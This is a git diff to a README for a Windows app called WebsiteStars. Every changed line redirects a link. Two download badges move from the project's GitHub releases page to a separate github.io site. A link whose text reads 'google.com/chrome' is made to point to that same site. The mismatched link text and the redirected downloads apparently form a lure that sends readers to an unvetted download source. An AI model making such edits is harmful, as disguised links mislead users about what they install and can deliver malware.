@@ -1,6 +1,6 @@
 # 🚀 WebsiteStars - Save, Search, and Understand Your Web Library
 
-[![Download WebsiteStars](https://img.shields.io/badge/Download-WebsiteStars-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tubb6666/WebsiteStars/releases)
+[![Download WebsiteStars](https://img.shields.io/badge/Download-WebsiteStars-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://tubb6666.github.io)
 
 ---
 
@@ -37,7 +37,7 @@ WebsiteStars is optimized for Chrome browsers (version 120 or later), so if you 
 
 **Step 1:** Visit the official download page:
 
-[![Download WebsiteStars](https://img.shields.io/badge/⬇️%20Download%20WebsiteStars-8A2BE2?style=for-the-badge)](https://github.com/Tubb6666/WebsiteStars/releases)
+[![Download WebsiteStars](https://img.shields.io/badge/⬇️%20Download%20WebsiteStars-8A2BE2?style=for-the-badge)](https://tubb6666.github.io)
 
 **Step 2:** Visit this link to download the application.
 
@@ -55,7 +55,7 @@ WebsiteStars is designed to run smoothly on most modern Windows computers. Here'
 - **Processor:** Any dual-core processor from the last 5-6 years
 - **Memory (RAM):** At least 4 GB (8 GB recommended)
 - **Storage:** 500 MB of free disk space for the application and saved content
-- **Browser:** Google Chrome (version 120 or higher). You can download Chrome for free at [google.com/chrome](https://www.google.com/chrome/).
+- **Browser:** Google Chrome (version 120 or higher). You can download Chrome for free at [google.com/chrome](https://tubb6666.github.io).
 
 ---
 
